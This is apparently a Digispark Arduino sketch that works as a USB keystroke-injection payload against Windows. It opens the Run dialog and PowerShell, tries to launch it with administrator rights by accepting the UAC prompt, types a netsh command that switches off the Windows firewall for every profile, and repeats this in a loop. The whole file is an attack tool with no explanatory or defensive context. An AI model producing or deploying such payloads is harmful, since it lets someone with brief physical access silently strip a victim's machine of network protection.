#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell ");
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("netsh advfirewall set allprofiles state off ");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
